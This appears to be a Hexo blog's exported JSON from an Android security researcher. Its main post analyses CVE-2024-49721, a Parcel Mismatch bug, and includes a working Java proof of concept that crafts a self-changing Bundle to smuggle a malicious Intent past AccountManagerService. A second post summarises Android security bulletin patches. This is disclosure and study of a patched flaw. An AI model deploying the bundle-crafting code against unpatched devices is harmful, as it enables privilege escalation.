{"meta":{"title":"残页的小博客","subtitle":null,"description":"残页的小博客~","author":"残页","url":"https://blog.canyie.top","root":"/"},"pages":[{"title":"404 Not Found","date":"2025-04-24T10:33:02.803Z","updated":"2025-04-24T10:33:02.803Z","comments":true,"path":"404.html","permalink":"https://blog.canyie.top/404.html","excerpt":"","text":"404 Not Found啊哦？页面不见了呢......"},{"title":"","date":"2025-05-08T14:02:26.662Z","updated":"2025-05-08T14:02:26.662Z","comments":true,"path":"sw-register.js","permalink":"https://blog.canyie.top/sw-register.js","excerpt":"","text":"\"serviceWorker\"in navigator&&(console.log(\"loading custom service worker...\"),window.addEventListener(\"load\",()=>{navigator.serviceWorker.register(\"/sw.js\").then(e=>console.log(\"Service Worker registered with scope:\",e.scope)).catch(e=>console.log(\"Service Worker registration failed:\",e))}));"},{"title":"","date":"2025-05-08T14:30:35.069Z","updated":"2025-05-08T14:30:35.069Z","comments":true,"path":"sw.js","permalink":"https://blog.canyie.top/sw.js","excerpt":"","text":"self.addEventListener(\"install\",e=>{console.log(\"sw.js: installed service worker\"),self.skipWaiting()}),self.addEventListener(\"activate\",e=>{e.waitUntil(caches.keys().then(e=>Promise.all(e.map(e=>(console.log(\"sw.js: removing cache \"+e),caches.delete(e))))))});"},{"title":"所有分类","date":"2025-04-24T10:33:02.827Z","updated":"2025-04-24T10:33:02.827Z","comments":true,"path":"categories/index.html","permalink":"https://blog.canyie.top/categories/index.html","excerpt":"","text":""},{"title":"关于","date":"2025-05-08T07:28:24.827Z","updated":"2025-05-08T07:28:24.827Z","comments":true,"path":"about/index.html","permalink":"https://blog.canyie.top/about/index.html","excerpt":"","text":"本站是残页无聊搭的一个小博客，基于 GitHub Pages + Hexo，主题为 Volantis关于我：网名叫“残页”“canyie” 是五六年级就开始用的网名了。出生于 2004/08/06，一个 20 岁的中职毕业生，目前大二，喜欢编程，喜欢航空。玻璃心，情绪化严重。Android Developer &amp; Security Researcher，研究方向主要偏向 framework &amp; runtime 等系统层面的Bugs:Android: contributed to CVE-2024-0044 (PoC &amp; writeup), CVE-2024-31318, CVE-2024-43080, CVE-2024-43081, CVE-2024-43088, CVE-2024-43090, CVE-2024-43762, CVE-2024-49733, CVE-2024-49741, CVE-2024-49743, CVE-2024-49744, CVE-2025-0100, CVE-2025-22432Huawei: CVE-2025-31175致谢与排名：截至 2025-05-08 在 Google Bug Hunters 平台上全球总排名 32，Android Program 排名第 6，2024 年度排名 #6（从 0 开始计数）。使用昵称 canyie 在 Android Security Acknowledgements、 Google Bug Hunters Leaderboard、小米安全中心、华为安全奖励计划思维方式和别人不太一样，可能令人无法理解 www（我在这里：QQ聊天 GitHub 知乎 看雪论坛 哔哩哔哩 Google BugHunters"},{"title":"我的朋友们","date":"2025-04-24T10:33:03.133Z","updated":"2025-04-24T10:33:03.133Z","comments":true,"path":"friends/index.html","permalink":"https://blog.canyie.top/friends/index.html","excerpt":"","text":"各位大佬想交换友链的话可以在 issue 区 留言，必须要有名称、头像链接、和至少一个标签哦～注：仅接受个人网站申请。若您的网站原创内容过少、内容质量过低或为内容农场类网站可能被拒绝。内容不强制为技术类，但若内容过于敏感或违反法律可能被拒绝。名称： 残页的小博客头像： https://blog.canyie.top/data/image/avatar_new.jpg网址： https://blog.canyie.top/标签： Android"},{"title":"所有标签","date":"2025-04-24T10:33:03.133Z","updated":"2025-04-24T10:33:03.133Z","comments":true,"path":"tags/index.html","permalink":"https://blog.canyie.top/tags/index.html","excerpt":"","text":""},{"title":"","date":"2025-04-24T10:33:03.091Z","updated":"2025-04-24T10:33:03.091Z","comments":true,"path":"data/js/search_children.js","permalink":"https://blog.canyie.top/data/js/search_children.js","excerpt":"","text":"var domain=\"http://qzonestyle.gtimg.cn/qzone_v6/lostchild/\";document.write(''),document.write('');"}],"posts":[{"title":"CVE-2024-49721 InputMethodSubtypeArray 反序列化漏洞分析","slug":"CVE-2024-49721","date":"2025-02-04T14:00:00.000Z","updated":"2025-04-24T10:33:02.810Z","comments":true,"path":"2025/02/04/CVE-2024-49721/","link":"","permalink":"https://blog.canyie.top/2025/02/04/CVE-2024-49721/","excerpt":"神马，都 2025 年啦，还有 Parcel Mismatch 漏洞？！？对！你没听错！最经典最被广泛利用的 Parcel Mismatch 漏洞，它又双叒叕来了！怕了吗？！？去年我和 Cxxsheng 对整个 Parcelable IPC 机制进行了一些研究，并开发了一个扫描器用以扫描相关漏洞。此漏洞就是我们研究过程中发现的漏洞之一。我们于 2024 年 12 月 3 日提交漏洞报告，后被告知与另一份漏洞报告重复。以下记录了我们当时的分析。部分敏感信息已被移除或脱敏以保证安全。","text":"神马，都 2025 年啦，还有 Parcel Mismatch 漏洞？！？对！你没听错！最经典最被广泛利用的 Parcel Mismatch 漏洞，它又双叒叕来了！怕了吗？！？去年我和 Cxxsheng 对整个 Parcelable IPC 机制进行了一些研究，并开发了一个扫描器用以扫描相关漏洞。此漏洞就是我们研究过程中发现的漏洞之一。我们于 2024 年 12 月 3 日提交漏洞报告，后被告知与另一份漏洞报告重复。以下记录了我们当时的分析。部分敏感信息已被移除或脱敏以保证安全。本文包含了一个简单的 PoC。由于大部分用户都已经升级到有 checkKeyIntentParceledCorrectly 额外补丁的版本，参照以前类似漏洞的利用方法直接把本文里的 PoC 代码拿去攻击无法成功，故我们认为大部分用户已经得到保护，披露相关细节是安全的。我们在此次研究中产出的其他文章（持续更新）：万众瞩目却又被大家忽略的历史漏洞：CVE-2022-20474分析——LazyValue下的Self-changed Bundle by Cxxsheng细节检出 android-12.0.0_r1 分支的源码，查看 InputMethodSubtypeArray.java 这个文件（点击可直接跳转），关注它的序列化和反序列化过程。反序列化：1234567891011121314/** * Unmarshall an instance of &#123;@link InputMethodSubtypeArray&#125; from a given &#123;@link Parcel&#125; * object. * * @param source A &#123;@link Parcel&#125; object from which &#123;@link InputMethodSubtypeArray&#125; will be * unmarshalled. */public InputMethodSubtypeArray(final Parcel source) &#123; mCount = source.readInt(); if (mCount &gt; 0) &#123; mDecompressedSize = source.readInt(); mCompressedData = source.createByteArray(); &#125;&#125;序列化：123456789101112131415161718192021222324252627282930313233343536373839404142434445/** * Marshall the instance into a given &#123;@link Parcel&#125; object. * * &lt;p&gt;This methods may take a bit additional time to compress data lazily when called * first time.&lt;/p&gt; * * @param source A &#123;@link Parcel&#125; object to which &#123;@link InputMethodSubtypeArray&#125; will be * marshalled. */public void writeToParcel(final Parcel dest) &#123; if (mCount == 0) &#123; dest.writeInt(mCount); return; &#125; byte[] compressedData = mCompressedData; int decompressedSize = mDecompressedSize; if (compressedData == null &amp;&amp; decompressedSize == 0) &#123; synchronized (mLockObject) &#123; compressedData = mCompressedData; decompressedSize = mDecompressedSize; if (compressedData == null &amp;&amp; decompressedSize == 0) &#123; final byte[] decompressedData = marshall(mInstance); compressedData = compress(decompressedData); if (compressedData == null) &#123; decompressedSize = -1; Slog.i(TAG, \"Failed to compress data.\"); &#125; else &#123; decompressedSize = decompressedData.length; &#125; mDecompressedSize = decompressedSize; mCompressedData = compressedData; &#125; &#125; &#125; if (compressedData != null &amp;&amp; decompressedSize &gt; 0) &#123; dest.writeInt(mCount); dest.writeInt(decompressedSize); dest.writeByteArray(compressedData); &#125; else &#123; Slog.i(TAG, \"Unexpected state. Behaving as an empty array.\"); dest.writeInt(0); &#125;&#125;很明显能看出来两边逻辑不一致。反序列化的时候首先会读一个 int 作为 count，count 大于 0 的时候才会读 decompressed size（int）和 compressed data （byte[]）。而序列化的时候，count == 0 的时候确实只会写一个 int 0 进去，如果 count 不为 0，底下有两个分支，一个分支会写 count（int）、decompressed size（int）和 compressed data（byte[]），另一个分支只会写 int 0 作为 count。所以问题就在于这个 count。简单枚举一下所有情况：count &gt; 0 的时候，一边写 int、int、byte[] 进去，另一边读 int、int、byte[] 出来，没问题；count == 0 的时候，一边只会写 int 0 进去，另一边读 int 出来，也没问题。而如果 count &lt; 0，就有可能发生一边写了 int、int、byte[] 进去，而另一边只读了一个 int 出来的情况，造成数据残留，也即所谓的 parcel mismatch 问题。那么问题就转换成，在攻击者指定负数 count 的情况下，是否存在能让 compressedData != null &amp;&amp; decompressedSize &gt; 0 的情况，从而多写内容进 parcel？注意到这个 if 上面还有个 if，当 compressedData == null &amp;&amp; decompressedSize == 0 时，会调用 marshall 和 compress 对两个字段进行重新赋值。这就是 count &lt; 0 的时候会发生的情况，看一下这两个函数的实现：12345678910111213141516171819202122232425private static byte[] marshall(final InputMethodSubtype[] array) &#123; Parcel parcel = null; try &#123; parcel = Parcel.obtain(); parcel.writeTypedArray(array, 0); return parcel.marshall(); &#125; finally &#123; if (parcel != null) &#123; parcel.recycle(); parcel = null; &#125; &#125;&#125;private static byte[] compress(final byte[] data) &#123; try (final ByteArrayOutputStream resultStream = new ByteArrayOutputStream(); final GZIPOutputStream zipper = new GZIPOutputStream(resultStream)) &#123; zipper.write(data); zipper.finish(); return resultStream.toByteArray(); &#125; catch(Exception e) &#123; Slog.e(TAG, \"Failed to compress the data.\", e); return null; &#125;&#125;我们的例子里要压缩的数据 mInstance 是 null，在 writeTypedArray 里会写一个 -1 进去作为长度，返回一个有数据的 byte[]，然后进入 compress 里进行 gzip 压缩，最后生成有内容的 byte[]，刚好满足下面的条件，触发漏洞。需要注意的是，这个漏洞在 Android 14 中已经被修复，补丁： https://github.com/aosp-mirror/platform_frameworks_base/commit/bc2fbfc0b73535ce9d0c9f73b5130cfffaf4daee然而这个补丁在很长的一段时间内并没有被当成安全补丁反向移植到旧版本。复现此漏洞属于我们所谓的 Parcel Mismatch 漏洞，这是一类最早可追溯至 2014 年的漏洞，最早由 Michal Bednarski 报告。对于此类漏洞应该如何利用，需要一些前置知识。这里不赘述，给出一些相关文章供大家参考：经典的入门教程：Bundle风水——Android序列化与反序列化不匹配漏洞详解 by heeeeen，虽然年代久远但并不影响学习比较新的文章，cover 了更多 case：Parcelable和Bundle的爱恨情仇（一）——读写不匹配 by OPPO安珀实验室另一篇很好的入门文章，PoC 里详细解释了每一个值的作用及 mismatch 后的新意义：再谈Parcelable反序列化漏洞和Bundle mismatch by 小路相关漏洞大总结：Android 反序列化漏洞攻防史话 by 有价值炮灰一篇主要关注实际各类漏洞如何利用的文章：LaunchAnyWhere 补丁绕过：Android Bundle Mismatch 系列漏洞 复现与分析 by Clang裁缝店读者也可以自行上网搜索，关键词： Android Parcel Mismatch、Bundle Mismatch、Self-changing Bundle 及 EvilParcel bug 等。参考以往 parcel mismatch 漏洞的利用，我们这里构造一个 self changing bundle 并把一个恶意的指向系统私有未导出 PlatLogoActivity 的 intent 隐藏进去。构造的恶意 intent：1new Intent().setClassName(\"android\", \"com.android.internal.app.PlatLogoActivity\")需要注意的是，Android 13 引入的 Lazy Bundle 增强措施导致我们无法再使用这种 parcel mismatch 构造 self changing bundle，所以需要使用 Android 12 或更旧的版本进行测试。较新的安全补丁里引入了一个额外的安全检查 checkKeyIntentParceledCorrectly 对整个 AccountManagerService 进行了加固，导致我们即使使用 android 12，如果安全补丁比较新，像往常一样直接把恶意 bundle 返回给 AccountManagerService 也无法触发漏洞。这里我们只在代码里模拟一下整个流程。InputMethodInfo如果你直接按照往常的经验在 parcel 里写入 InputMethodSubtypeArray 的类名，写入恶意数据然后直接使用，恭喜你收到一个 BadParcelableException 作为结果。这是因为，我们可爱的 InputMethodSubtypeArray 这个类，根本就没有实现 Parcelable 这个接口，也就是说它根本不是一个 parcelable。代码里唯一会用到这个类的地方就是 InputMethodInfo，这个类可就是根正苗红的 Parcelable 了，它序列化和反序列化的过程都会调用到 InputMethodSubtypeArray：12345678910111213141516171819202122232425262728293031323334353637InputMethodInfo(Parcel source) &#123; mId = source.readString(); mSettingsActivityName = source.readString(); mIsDefaultResId = source.readInt(); mIsAuxIme = source.readInt() == 1; mSupportsSwitchingToNextInputMethod = source.readInt() == 1; mInlineSuggestionsEnabled = source.readInt() == 1; mSuppressesSpellChecker = source.readBoolean(); mShowInInputMethodPicker = source.readBoolean(); mIsVrOnly = source.readBoolean(); mService = ResolveInfo.CREATOR.createFromParcel(source); mSubtypes = new InputMethodSubtypeArray(source); mHandledConfigChanges = source.readInt(); mForceDefault = false;&#125;/** * Used to package this object into a &#123;@link Parcel&#125;. * * @param dest The &#123;@link Parcel&#125; to be written. * @param flags The flags used for parceling. */@Overridepublic void writeToParcel(Parcel dest, int flags) &#123; dest.writeString(mId); dest.writeString(mSettingsActivityName); dest.writeInt(mIsDefaultResId); dest.writeInt(mIsAuxIme ? 1 : 0); dest.writeInt(mSupportsSwitchingToNextInputMethod ? 1 : 0); dest.writeInt(mInlineSuggestionsEnabled ? 1 : 0); dest.writeBoolean(mSuppressesSpellChecker); dest.writeBoolean(mShowInInputMethodPicker); dest.writeBoolean(mIsVrOnly); mService.writeToParcel(dest, flags); mSubtypes.writeToParcel(dest); dest.writeInt(mHandledConfigChanges);&#125;mSubtypes 就是 InputMethodSubtypeArray。需要注意的是我们这里用的是 Android 12 的源码，新的版本里往这个类加入了其他字段，会影响我们构造 bundle 的结构，这部分不重要，这里略过不讲。多字节？少字节！往常的漏洞里，多出的或者少掉的数据一般是攻击者可控的，因为 parcelable 本来就是传输对象内部数据的，从 parcel 读出攻击者指定的恶意数据然后再把它写进 parcel 是非常合理的。像多出 4 个字节的漏洞，一般是指定一个 0 来构造 bundle，让 bundle 读出一个原本不存在的 0 长字符串当成 key 从而影响后续解析。而这个漏洞里多出来的可不止四个字节，而是一个 int 和一个 byte[]，数据稳定但并不受我们控制。经过实验，parcel 内会残留 32 字节数据，多写的 (int) decompressedSize 作为 size 会在 InputMethodInfo 被当成 mHandledConfigChanges 读取，后续 bundle 再读取一个 String16 当成 key，这里实际读取位置已经在 byte[] 里。读 String16 会先读一个 int 作为 length，而写 byte[] 正好也会先写 length 进去，所以 byte[] 的 length 会被当成 String16 的 length。编写测试代码把残留的第一个 int 读出来，结果为 24，而总的残留大小为 32，减去两个 int 的大小，的确就是 24。很合理。然后你会觉得 key 长度刚好等于 byte[] 长度所以刚好会把整个 byte[] 都消耗掉？当然不对，key 作为一个 String16，里面一个字符占两个字节，同时结尾必须是 \\0 作为结束符，所以实际消耗的数据会比 byte[] 更多，按照多出字节的思路去构造是不对的，我们应该按照少了字节的思路去补齐这个 key，然后再在后面去填充恶意 payload。一开始由于长度的计算错误，我以为这个长度不够我按以往的“插入一个 VAL_BYTEARRAY ”的方式去隐藏恶意 intent，所以我这里给出的 PoC 是把 intent 隐藏在了下一个 key 里面，以前都没怎么看见过有人藏进 string 里面，算是比较新的思路？后面发现大小应该是够的，懒得再改代码了。不过这种方法有个缺陷，因为 intent 现在是 key 的一部分，修改 intent 会导致 key 的 hash code 改变，而 bundle 的排序是按 hash code 排的，需要对 bundle 里的所有 key 都精心布局避免发生错位。我这里只使用一个固定的 intent 进行演示，因此在代码里直接写死就好。PoC 如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586 public static Bundle makeBundle(Intent intent) &#123; Parcel parcel = Parcel.obtain(); parcel.writeInt(0); // bundle size parcel.writeInt(0x4C444E44); // BUNDLE_MAGIC_NATIVE, 'B' 'N' 'D' 'N' parcel.writeInt(3); // bundle key-value pair count parcel.writeString(\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"); // key of first kv pair, mismatch object is here parcel.writeInt(4); // VAL_PARCELABLE writeMismatchObject(parcel); // value // remaining 24 bytes, write second kv pair parcel.writeString(createStringPayload(intent)); // first interpreted as key parcel.writeInt(-1); // VAL_NULL parcel.writeString(\"zzzzzzzzzzzz\"); // last key parcel.writeInt(-1); // VAL_NULL parcel.setDataPosition(0); parcel.writeInt(parcel.dataSize() - 12); // reset bundle size parcel.setDataPosition(0); Bundle bundle = new Bundle(); bundle.readFromParcel(parcel); parcel.recycle(); return bundle; &#125; private static String createStringPayload(Intent intent) &#123; Parcel parcel = Parcel.obtain(); // -24 parcel.writeInt(0); // string length // -20 parcel.writeInt(1); // -16 parcel.writeInt(2); // -12 parcel.writeInt(3); // -8 parcel.writeInt(4); // -4 parcel.writeInt(0); // string null terminator parcel.writeInt(-1); // VAL_NULL // New Key-Value Pair appears! parcel.writeString(AccountManager.KEY_INTENT); // key parcel.writeInt(4); // VAL_PARCELABLE parcel.writeParcelable(intent, 0); // value parcel.writeInt(0); // string null terminator parcel.setDataPosition(0); parcel.writeInt((parcel.dataSize() - 8) / 2); parcel.setDataPosition(0); try &#123; return parcel.readString(); &#125; finally &#123; parcel.recycle(); &#125; &#125; private static void writeMismatchObject(Parcel parcel) &#123; parcel.writeString(InputMethodInfo.class.getName());// try &#123;// InputMethodInfo inputMethodInfo = new InputMethodInfo(\"aaa\", \"bbb\", \"ccc\", \"ddd\");// Field mSubtypes = InputMethodInfo.class.getDeclaredField(\"mSubtypes\");// mSubtypes.setAccessible(true);// Object subtypes = mSubtypes.get(inputMethodInfo);// Class&lt;?&gt; cls = Class.forName(\"android.view.inputmethod.InputMethodSubtypeArray\");// Field mCount = cls.getDeclaredField(\"mCount\");// mCount.setAccessible(true);// mCount.set(subtypes, -1);// parcel.writeParcelable(inputMethodInfo, 0);// &#125; catch (Exception e) &#123;// throw new RuntimeException(e);// &#125; parcel.writeString(null); // mId parcel.writeString(null); // mSettingsActivityName parcel.writeInt(0); // mIsDefaultResId parcel.writeInt(0); // mIsAuxIme parcel.writeInt(0); // mSupportsSwitchingToNextInputMethod parcel.writeInt(0); // mInlineSuggestionsEnabled parcel.writeInt(0); // mSupportsInlineSuggestionsWithTouchExploration parcel.writeBoolean(false); // mSuppressesSpellChecker parcel.writeBoolean(false); // mShowInInputMethodPicker parcel.writeBoolean(false); // mIsVrOnly; parcel.writeBoolean(false); // mIsVirtualDeviceOnly new ResolveInfo().writeToParcel(parcel, 0); // mService// mSubtypes.writeToParcel(dest); parcel.writeInt(-1); // mSubtypes.mCount parcel.writeInt(0); // mHandledConfigChanges &#125;我这里用 BUNDLE_MAGIC_NATIVE 纯粹是我个人喜欢用，不过看其他人似乎都不喜欢用这个，用 BUNDLE_MAGIC 应该也能触发。随便打了几个字符串是为了凑 hash，虽然不太好看但是 it works模拟系统读入 bundle 然后转发 bundle 的测试代码：1234567891011121314151617Parcel parcel = Parcel.obtain();Intent intent = new Intent().setClassName(\"android\", \"com.android.internal.app.PlatLogoActivity\");Bundle bundle = makeBundle(intent);// simulate AccountManagerService readparcel.setDataPosition(0);// Authenticator app -&gt; AccountManagerServiceparcel.writeBundle(bundle);parcel.setDataPosition(0);Bundle b1 = parcel.readBundle();Log.e(\"PoC\", \"intent in init bundle: \" + bundle.getParcelable(AccountManager.KEY_INTENT));Log.e(\"PoC\", \"first deserialization: \" + b1.getParcelable(AccountManager.KEY_INTENT));parcel.setDataPosition(0);// AccountManagerService -&gt; callerparcel.writeBundle(b1);parcel.setDataPosition(0);Bundle b2 = parcel.readBundle();Log.e(\"PoC\", \"second deserialization: \" + b2.getParcelable(AccountManager.KEY_INTENT)运行测试代码可以发现，第一次读 intent 的时候返回 null，第二次恶意 intent 出现。在未打补丁且没有 checkKeyIntentParceledCorrectly 的 Android 12 系统上，把构造好的 bundle 返回给 AccountManagerService，PlatLogoActivity 直接被成功拉起。至于它在有 checkKeyIntentParceledCorrectly 的系统上有什么作用，能造成什么危害，就留给读者自己去思考。修复2025 年 2 月 Android 安全公告 对该漏洞发布了一个补丁 InputMethodSubtypeArray: prevent negative count injection，mCount &lt; 0 的情况会直接抛出异常中断反序列化流程。这个补丁被移植到了 Android 12、12L、13 （14 已经包含该修复），Android 11 或更低版本已经 EOL。AccountManagerService 整个流程可能会引入新的保护：Sanitize Bundle from AbstractAccountAuthenticator，app 返回的 bundle 中的内容会被拷贝到一个新的 bundle 中，且只有在白名单的 key 和 value 会被保留，而允许的 Parcelable 类型仅有 AccountManager.KEY_INTENT 一项，阻止了 bundle 内含有任意 Parcelable 类型进而 mismatch。需要注意的是该提交目前是已经被回滚的状态所以并未生效，但描述中表示 A new version will be created.，所以可以预计将会在未来版本中上线。总结这个漏洞的历史非常久远，2014 年 3 月 6 日引入此类的第一个提交 Introduce InputMethodSubtypeArray for memory efficient IPCs 就已经存在此漏洞，可能是 Android 史上生存时间最长的 parcel mismatch 漏洞。而由于其直接存在于 AOSP 而非 OEM 代码内，影响范围可谓是极大。挖掘此类漏洞的人千千万，这个类存在的判断差异也非常明显，为什么各种扫描器都没扫出来这个洞？我觉得可能是因为这个类并没有直接实现 Parcelable 导致大部分扫描器一开始就直接把它忽略了，即使有爆出警告，由于逻辑较为复杂，很可能在后续的人工 review 过程里被认为是误报而忽略。除了 Google 给出的修复方法，另一种思路是把序列化流程里的 if (mCount == 0) 改成 if (mCount &lt;= 0)，让负数 count 也只写一个 int 进去即可。可惜这种方法并没有被采用，要不然此漏洞跟上一次被大规模利用的同类漏洞 CVE-2023-20963 就可以一起被称为“少打一个运算符的代价”了（那么，此漏洞终结之后，我们有了一个新的疑问：自 2014 年，Android 系统开发人员、供应链开发者及各设备厂商程序员就不断与此类反序列化漏洞作斗争，漏洞不断被写出来又不断被发现和修复，直到 2025 年的今天，开发人员也时常因为各种疏漏而写出类似 bug。那么，这个漏洞，会是最后一个 Parcel Mismatch 漏洞吗？我们拭目以待。","categories":[],"tags":[{"name":"android","slug":"android","permalink":"https://blog.canyie.top/tags/android/"},{"name":"system","slug":"system","permalink":"https://blog.canyie.top/tags/system/"},{"name":"安全","slug":"安全","permalink":"https://blog.canyie.top/tags/%E5%AE%89%E5%85%A8/"},{"name":"parcel","slug":"parcel","permalink":"https://blog.canyie.top/tags/parcel/"}]},{"title":"Android 2025 年每月安全补丁分析索引","slug":"android-security-bulletin-index-2025","date":"2025-01-29T06:00:00.000Z","updated":"2025-06-09T15:29:27.904Z","comments":true,"path":"2025/01/29/android-security-bulletin-index-2025/","link":"","permalink":"https://blog.canyie.top/2025/01/29/android-security-bulletin-index-2025/","excerpt":"2024 年度补丁分析：点我给大家分享一个好消息，经过一年的研究，我现在在 Google BugHunters 平台上总排名 32，2024 年度第 6 名，Android Program 第 6 名！感谢各位一年陪伴！最后更新时间：2025/06/09 更新内容：更新 06","text":"2024 年度补丁分析：点我给大家分享一个好消息，经过一年的研究，我现在在 Google BugHunters 平台上总排名 32，2024 年度第 6 名，Android Program 第 6 名！感谢各位一年陪伴！最后更新时间：2025/06/09 更新内容：更新 06状态更新：由于本人健康问题，预计近期对电子产品的使用将会受限，此博客跟我的频道可能会更新缓慢，尝试联系我可能无法连通或回复缓慢，建议关注我的频道获取最新状态2025-06-01Android RuntimeCVE-2025-26456 DoS HighDexUseManager 内限制 dex 使用记录的数据的大小。FrameworkCVE-2025-26450 EoP HighKeyEvent 发送给输入法之前先验证其确实来自系统，且其不是太早之前产生的（防止重放攻击）CVE-2025-26452 EoP HighResourcesImpl 加载 FRRO 的时候保证其确实是一个 FRRO （在 /data/resource-cache/ 下并且以 .frro 结尾）。看漏洞描述是可以读其他 task 的快照CVE-2025-26455 EoP HighAMediaCodec_getInputBuffer 和 AMediaCodec_getOutputBuffer 两个函数的返回值相关的越界写入问题CVE-2025-26458 EoP HighLocationProviderManager 内发送 PendingIntent 的时候加上 setPendingIntentBackgroundActivityLaunchAllowed(false) 阻止 BALCVE-2025-26462 EoP HighAccessibilityService onBind() 返回 null 时需要 unbind，防止 BALCVE-2025-32312 EoP HighPackageParser 校验输入类名必须是一个 IntentInfo 的子类，防止调用任意 class 的构造函数。这个补丁打断了 https://github.com/michalbednarski/TheLastBundleMismatch 里用到的 trampoline，防止绕过 lazy value 保护创造出 self-changing bundle。CVE-2025-26437 ID HighCredentialManagerService getCandidateCredentials() 校验调用者必须是默认的 Credential Autofill service，只影响 15CVE-2025-26448 ID HighCursorWindow 内使用 calloc 代替 malloc 避免未初始化内存CVE-2025-26432 DoS HighCompanionDeviceManagerService setAssociationTag 限制 tag 最大长度为 1024。只影响 15CVE-2025-26449 DoS High传递 AutomaticZenRule 和 ZenModeConfig 时使用 ParceledListSlice ，防止单次数据量过大超过 binder 传输大小上限CVE-2025-26463 DoS HighBlobStoreManager allowPackageAccess 内限制传入包名和证书的大小。SystemCVE-2025-26443 EoP HighManagedProvisioning HtmlToSpannedParser 内限制传入的 url 必须是 http 或 https 的，看漏洞描述是可以安装 app，猜测是使用 file 或者 content 的 uri。其实没看懂咋做到的，明明 createIntent 内部有一个一模一样的检查，为什么要在外面再加一个？CVE-2025-26441 ID High蓝牙协议栈 sdp_discovery.cc 中的越界读取CVE-2025-26445 ID HighConnectivityService offerNetwork 添加权限检查。CVE-2025-26453 ID High蓝牙 BluetoothOppSendFileInfo 内读取 decode 过的 Authority 再手动解析 user id 而非使用 getUserInfo，防止被 encoded 的 @ 字符绕过检查，跟之前的 CVE-2025-0082/CVE-2025-0083 类似。2025-05-01在野利用漏洞：CVE-2025-27363，终于不是 USB 了FrameworkCVE-2023-21342 EoP High绑定到应用提供的 speech RecognitionService 时不指定 BIND_ALLOW_BACKGROUND_ACTIVITY_STARTS 标记，避免 BAL bypassAndroid 14 就修了的洞，现在 backport 给 13CVE-2024-34739 EoP High去年八月就放过一遍，不知道为什么又放了一遍。设置向导未完成时，插入 USB 设备不弹出 activity，避免 FRP 绕过。CVE-2025-0077 EoP High切换用户过程中的 race condition，有概率导致切换到其他用户后不显示目标用户设置的锁屏。只影响 15。这个问题我很早也注意到了，可惜一直没能稳定复现出来。CVE-2025-0087 EoP HighPackageInstaller 内的逻辑 bug，请求为其他用户卸载 app 时只在当前用户是目标用户的父用户的情况下才允许。CVE-2025-22425 EoP HighPackageInstaller 内使用了不安全的 getCallingPackage 函数获取调用者，可能被伪造结果，改成使用 getLaunchedFromPackage。CVE-2025-26422 EoP HighWindowManagerService dump 函数内的权限检查放错了位置，调用者传递 --high-priority 参数的时候不会检查权限，造成敏感信息泄露。只影响 15。CVE-2025-26426 EoP HighregisterReceiver 在调用者给定 caller package = &quot;android&quot; 时需要保证 calling uid 真的是 core uid。CVE-2025-26427 EoP High跟 CVE-2024-0032 一样，限制不让访问 /sdcard/Android/data。不知道同一个漏洞还能放多少遍。。。CVE-2025-26428 EoP High如果当前 task 已经进入 lock task mode，忽略后续的 app pinning 请求。CVE-2025-26436 EoP High清楚一个 PendingIntentRecord 的 BAL token 的时候也要顺带清掉它带的 allowlist duration。CVE-2025-26440 EoP HighCameraService 优化 app 前后台状态改变时的处理代码，避免后台 app 仍然能使用摄像头的问题CVE-2025-26444 EoP HighVoiceInteractionManagerService 会在用户强行停止第三方语音助手时将目前选择的语音助手设置成系统默认的，重设 ROLE_ASSISTANT 会导致额外权限被授权给默认的语音助手，这不是合理的行为所以删除相关处理。CVE-2025-26424 ID HighVpnManagerService 新增的 getFromVpnProfileStore、putIntoVpnProfileStore、removeFromVpnProfileStore、listFromVpnProfileStore 添加权限检查。只影响 15CVE-2025-26442 ID High之前 CVE-2024-49742 的补丁有问题，错误的检查了 resolve 出来的组件的包名而非整个组件名，所以可以通过声明两个组件的方式来绕过补丁。CVE-2025-26429 DoS HighAppOpsService collectOps 内限制返回的数据大小，避免过大超过 binder 数据传输大小限制造成异常。SystemCVE-2025-27363 RCE High上游 freetype 中的整数溢出 bugCVE-2025-26420 EoP High官方未放出此漏洞补丁链接，手动查找得到：https://android.googlesource.com/platform/packages/modules/Permission/+/5c07da90f7ae911b9e64d4e34871b7d2115a0a7f看起来是显示多个权限请求对话框时的内容遮盖问题。官方给出的漏洞描述：In multiple functions of GrantPermissionsActivity.java , there is a possible way to trick the user into granting the incorrect permission due to permission overload. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation.CVE-2025-26421 EoP High添加了一个可以自定义的 config_biometric_protected_package_names，当用户在设置里尝试强行停止、禁用或卸载这些被保护的 app 的更新时要求用户验证身份再继续。没太看懂，漏洞描述：In multiple locations, there is a possible lock screen bypass due to a logic error in the code. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation.CVE-2025-26423 EoP High添加 Wi-Fi 网络时检查附带的 IpConfiguration 和 ProxyInfo 的大小。CVE-2025-26425 EoP HighRoleService 的 getDefaultApplicationAsUser/setDefaultApplicationAsUser 两个 API 限制只能在 Android 14+ 上被调用，因为里面是通过检查 MANAGE_DEFAULT_APPLICATIONS 这个权限来确保这些 API 不被滥用的，在 Android 13 或更低版本的系统上 MANAGE_DEFAULT_APPLICATIONS 权限并不存在，所以第三方 app 可以自己定义这个权限然后给自己授权从而绕过 RoleService 里面的检查。CVE-2025-26430 EoP HighSettings SpaAppBridgeActivity 里检查 package name 只能包含合法字符串，猜测是注入 / 字符伪造后面的 user idCVE-2025-26435 EoP High禁止访客用户禁用 deceptive app scanningCVE-2025-26438 EoP High蓝牙 SMP 协议实现中的验证绕过 bugCVE-2023-35657 ID High蓝牙 BTA 层的类型混淆，会导致越界读2025-04-01Android 12 &amp; 12L 的支持已于本月结束，呜呜呜在野利用漏洞：CVE-2024-53150、CVE-2024-53197，都是内核 USB 模块FrameworkCVE-2025-22429 ID Criticalbundle 解析过程中的逻辑 bug，try 块中调用 readArrayMap 解析其值，finally 块中判断若 lazy value 数量为 0 则说明不需要 lazy unparcel，直接释放 parcel。但这个 lazy value 数量是使用 readArrayMap 的返回值来描述的，如果 readArrayMap 已经成功创建了一些 LazyValue 但在后续解析过程中抛出异常，由于 readArrayMap 并没有正常返回自然也就没有返回值，此时上层记录的 lazy value 数量还是 0，parcel 在 finally 中被释放，后续 LazyValue 再使用 parcel 就会产生 UAF。注意，若进程开启了 Defuse （在 system_server 内满足此条件），对 BadParcelableException 的 catch 块内清空了 map，而从代码上来看失去引用的 LazyValue 并不会操作 parcel，所以我猜测想实际触发这个漏洞需要一个并非 BadParcelableException 但在上层被 catch 的异常才能让 LazyValue 